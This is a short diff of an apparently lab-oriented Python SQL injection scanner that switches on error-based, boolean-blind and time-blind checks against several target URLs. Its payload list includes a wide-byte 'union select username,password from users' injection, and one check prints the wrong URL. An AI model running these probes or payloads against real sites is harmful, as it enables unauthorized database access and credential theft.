@@ -15,21 +15,21 @@ if __name__ == '__main__':
                 "kobe%df' union select username,password from users#"]
 
     request = Request.request()
-    # print(request.checkvul(url3, payloads[0]))
-    # print(request.checkvul(url4, payloads[0]))
-    # print(request.checkvul(url5, payloads[0]))
+    print(request.checkvul(url3, payloads[0]))
+    print(request.checkvul(url4, payloads[0]))
+    print(request.checkvul(url5, payloads[0]))
 
-    # if request.checkvul(url6, payloads[0]):
-    #     print("url:%s has a SQL vulnerability" % url6)
-    # elif request.is_eq_(url6, payloads[1], payloads[2]):
-    #     print("SQL bool blinds vulnerability :%s" % url6)
-    #
-    # if request.checkvul(url7, payloads[0]):
-    #     print("SQL vulnerability :%s" % url8)
-    # elif request.is_eq_(url7, payloads[1], payloads[2]):
-    #     print("SQL bool blinds vulnerability :%s" % url7)
-    # elif request.is_time_inj(url7, payloads[3]) >= 3:
-    #     print("SQL time blinds vulnerability :%s" % url7)
+    if request.checkvul(url6, payloads[0]):
+        print("url:%s has a SQL vulnerability" % url6)
+    elif request.is_eq_(url6, payloads[1], payloads[2]):
+        print("SQL bool blinds vulnerability :%s" % url6)
+
+    if request.checkvul(url7, payloads[0]):
+        print("SQL vulnerability :%s" % url8)
+    elif request.is_eq_(url7, payloads[1], payloads[2]):
+        print("SQL bool blinds vulnerability :%s" % url7)
+    elif request.is_time_inj(url7, payloads[3]) >= 3:
+        print("SQL time blinds vulnerability :%s" % url7)
 
     if request.checkvul(url8, payloads[0]):
         print("SQL vulnerability1 :%s" % url8)
